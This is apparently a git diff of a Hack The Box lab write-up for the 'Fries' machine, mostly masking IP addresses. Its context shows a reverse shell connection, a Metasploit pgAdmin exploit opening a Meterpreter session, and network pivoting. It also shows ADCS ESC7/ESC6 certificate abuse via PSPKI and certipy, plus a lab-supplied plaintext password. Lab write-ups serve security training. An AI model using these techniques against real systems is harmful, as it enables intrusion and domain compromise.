@@ -44,7 +44,7 @@ Info:
 
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
-Nmap scan report for 10.10.11.96
+Nmap scan report for 10.10.XX.XX
 Host is up (0.032s latency).
 
 PORT      STATE SERVICE       VERSION
@@ -143,8 +143,6 @@ nano /etc/hosts
 
 We are given credentials directly from `HTB`:
 
-
-
 ```
 User: d.cooper@fries.htb
 Pass: D4LE11maan!!
@@ -162,8 +160,6 @@ We will perform `fuzzing` with the `FFUF` tool as follows:
 ```shell
 ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
 ```
-
-Info:
 
 ```
 
@@ -322,7 +318,7 @@ When we check our listener, we see the following:
 
 ```
 listening on [any] 7777 ...
-connect to [10.10.14.49] from (UNKNOWN) [10.10.11.96] 49872
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] 49872
 bash: cannot set terminal process group (430): Inappropriate ioctl for device
 bash: no job control in this shell
 postgres@858fdf51af59:~/data$ whoami
@@ -389,15 +385,15 @@ set VHOST db-mgmt05.fries.htb
 Now, if we run `exploit`, we see this:
 
 ```
-[*] Started reverse TCP handler on 10.10.14.49:7755 
+[*] Started reverse TCP handler on 10.10.XX.XX:7755 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
 [+] Successfully authenticated to pgAdmin
 [+] Successfully initialized sqleditor
 [*] Exploiting the target...
-[*] Sending stage (24768 bytes) to 10.10.11.96
+[*] Sending stage (24768 bytes) to 10.10.XX.XX
 [+] Received a 500 response from the exploit attempt, this is expected
-[*] Meterpreter session 1 opened (10.10.14.49:7755 -> 10.10.11.96:49808) at 2025-11-25 10:49:55 -0800
+[*] Meterpreter session 1 opened (10.10.XX.XX:7755 -> 10.10.XX.XX:49808) at 2025-11-25 10:49:55 -0800
 
 meterpreter > getuid
 Server username: pgadmin
@@ -545,7 +541,7 @@ sshuttle -r svc@<IP> -N
 Info:
 
 ```
-svc@10.10.11.96's password: 
+svc@10.10.XX.XX's password: 
 c : Connected to server.
 ```
 
@@ -716,8 +712,8 @@ netexec ldap <IP> -u svc_infra -p 'm6tnXXXXXXXXXXXX'
 Info:
 
 ```
-LDAP        10.10.11.96     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
-LDAP        10.10.11.96     389    DC01             [+] fries.htb\svc_infra:m6tnXXXXXXXXXXXX
+LDAP        10.10.XX.XX     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
+LDAP        10.10.XX.XX     389    DC01             [+] fries.htb\svc_infra:m6tnXXXXXXXXXXXX
 ```
 
 They are valid. Now we download a `ZIP` file for analysis in `BloodHound`.
@@ -802,7 +798,7 @@ URL = [ESC7 to ESC6 Configuration](https://www.thehacker.recipes/ad/movement/adc
 
 ```powershell
 Import-Module PSPKI
-$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
+$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "dc01.fries.htb"
 $configReader.SetRootNode($true)
 $configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
 ```
@@ -906,7 +902,7 @@ ntpdate fries.htb ; certipy-ad auth -pfx "administrator.pfx" -dc-ip '<IP>' -user
 Info:
 
 ```
-2025-11-27 11:14:06.774696 (-0800) +2178.775048 +/- 0.013958 fries.htb 10.10.11.96 s1 no-leap
+2025-11-27 11:14:06.774696 (-0800) +2178.775048 +/- 0.013958 fries.htb 10.10.XX.XX s1 no-leap
 CLOCK: time stepped by 2178.775048
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
